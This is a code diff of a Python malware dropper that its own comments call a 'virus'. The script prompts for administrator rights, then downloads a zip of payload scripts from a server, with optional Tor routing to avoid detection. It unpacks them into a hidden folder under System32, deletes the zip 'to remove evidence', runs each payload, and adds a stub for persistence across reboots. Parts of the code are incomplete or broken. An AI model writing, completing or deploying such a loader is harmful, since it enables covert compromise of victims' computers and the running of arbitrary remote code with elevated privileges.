@@ -1,84 +1,104 @@
-# the script that makes everyhting work
+# the script that makes everything work
 import os # To interact with operating system
 import sys # To interact with operating system
 import ctypes # to get admin privileges
 import requests # To download scripts
 import subprocess # to launch scripts with admin privileges
+import shutil # to copy script
 from zipfile import ZipFile # to deal with zip files
 
-ZIP_URL = 'http://127.0.0.1:8000/scripts'
+ZIP_URL = 'http://127.0.0.1:8000/scripts' # the url from which the zip containing the scripts will be downloaded
 ZIP_NAME = 'scripts.zip' # what the name of the zip containing the scripts should be called
 TOR_INITIAL = True # whether the script should make the intial request through tor or the clearweb. Recommended True so you don't leak what you're doing to the router
 
 scripts_paths = [] # the paths of the scripts
-ovpn_path = ''
 
-def check_admin(os):
-    if os == 'win':
+
+def check_admin(win=False):
+    if win: # for windows
         try:
-            return ctypes.windll.shell32.IsUserAnAdmin()
+            return ctypes.windll.shell32.IsUserAnAdmin() # check if admin
         except:
-            return False
-    else:
-        return os.getuid() == 0
+            return False # an exception will be raised if not admin
+    else: # for linux & MacOS (darwin)
+        return os.getuid() == 0 # check for admin
 
-def get_admin(os):
-    if os == 'win':
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
-    sys.exit()
+def get_admin(win=False):
+    if win:
+        is_python_script = os.path.basename(sys.executable).startswith('python')
+        if is_python_script: # check if the launching environment is a python script or a standalone exe since sys.argv needs to be different for each one (sys.argv[0] is 'python' so that causes problems for .exe files which are not started that way)
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) # restart the script, prompting for admin privileges
+        else: # for .exe files
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1) # restart the script, prompting for admin privileges
+    sys.exit() # stop the script that doesn't have admin
 
 def get_scripts(): # downloads the scripts and puts them all in one place
-    r = requests.get(ZIP_URL, headers={'os':sys.platform})
-    with open(ZIP_NAME, 'wb') as zip:
-        zip.write(r.content) # make the zip file from the recieved bits in the request
-    with ZipFile(ZIP_NAME, 'r') as zip:
+    r = requests.get(ZIP_URL, headers={'os':sys.platform}) # download the script zips and send the server your OS so it knows which scripts to send
+    with open(ZIP_NAME, 'wb') as zip: # create the zip file
+        zip.write(r.content) # put the binary content from the request into the zip file
+    with ZipFile(ZIP_NAME, 'r') as zip: # open the zip file in ZipFile mode so
         scripts = zip.namelist() # get the list of files in the zip
-        os.makedirs(scripts_direc, exist_ok=True) # make the directory for the scripts that were downloaded
         for script in scripts:
-            with open(f"{scripts_direc}\\{script}", 'wb') as s:
-                s.write(zip.read(script)) # put the contents of the file in the zip into the file you're making outside of the zip
-                if '.ovpn' in script:
-                    ovpn_path.join(f"{scripts_direc}\\{script}")
-                else:
-                    scripts_paths.append(f'{scripts_direc}\\{script}') # add the script and its path to the dictionary of script paths
-                s.close()
-        zip.close()
-    os.remove(ZIP_NAME)
+            with open(f"{scripts_direc}\\{script}", 'wb') as s: # make the file for each script
+                s.write(zip.read(script)) # put the contents of the script in the zip into the file being made outside of the zip in the chosen folder
+                if not '.ovpn' in script: # make sure that no .ovpn file is logged as a script
+                    scripts_paths.append(f'{scripts_direc}\\{script}') # add the script and its path to the list of script paths
+                s.close() # close the script file from memory
+        zip.close() # close the zip file from memory
+    os.remove(ZIP_NAME) # delete the zip file to remove evidence
 
 def start_scripts():
-    for script in scripts_paths:
-        if '.exe' in script:
-            subprocess.Popen([script], shell = False) # start each script as a child process of the starter script so they inherit the admin privileges
-        elif '.py' in script:
-            print(script)
-            subprocess.Popen(['python', script]) # start each script as a child process of the starter script so they inherit the admin privileges
+        for script in scripts_paths:
+            try:
+                if '.py' in script: # for python scripts
+                    subprocess.run([sys.executable, script]) # start each python script
+                else: # for any files
+                    subprocess.run(script, shell=True) # start each script
+            except: # if one of the scripts fail to run for any reason
+                pass
 
-if 'win' in sys.platform:
-    scripts_direc = ('C:\\Common Files')  # the directory where the script will hide new files
-    started_file = 'C:\\started.before'  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
-    if not check_admin('win'):
-        get_admin()
-elif 'linux' in sys.platform:
+def make_renewable(): # makes the script start with admin privileges every time the computer is restarted
+    pass
+
+def make_path_list():
+    with open(scripts_direc+'list','w') as f:
+        for script in scripts_paths:
+            f.write(f"{script}\n")
+        f.close()
+
+def load_paths():
+    with open(scripts_direc+'list','r') as f:
+        paths = f.readlines()
+        f.close()
+        return paths
+
+if 'win' in sys.platform: # check if win in sys.platform and not win == sys.platform because sys.platform might be win32 or win64 which work the same for this script
+    scripts_direc = (r'C:\Windows\System32\WXR')  # the directory where the script will hide new files
+    started_file = r'C:\Windows\log-olr'  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
+    if not check_admin(True):
+        get_admin(True)
+elif 'linux' == sys.platform:
     scripts_direc = ('')  # the directory where the script will hide new files
     started_file = ''  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
-    check_admin('linux')
+    check_admin()
     get_admin()
-elif 'darwin' in sys.platform:
+elif 'darwin' == sys.platform:
     scripts_direc = ('')  # the directory where the script will hide new files
     started_file = ''  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
-    check_admin('darwin')
+    check_admin()
     get_admin()
 else:
     # -- delete all evidence of the virus --
     sys.exit() # stop the script
 
-os.makedirs(scripts_direc, exist_ok=True) # make the directory for the scripts
-
 if os.path.exists(started_file): # check if the starter has run before and if you just need to start the scripts or download them as well
+    scripts_paths = load_paths()
     start_scripts()
 else:
+    os.makedirs(scripts_direc, exist_ok=True)  # make the directory for the scripts that will be downloaded
     get_scripts()
-    with open(started_file, 'w') as f:
+    make_path_list()
+    make_renewable()
+    with open(started_file, 'w') as f: # open the started file to log that the scripts were downloaded
         f.close()
-    print('starting scripts')
     start_scripts()
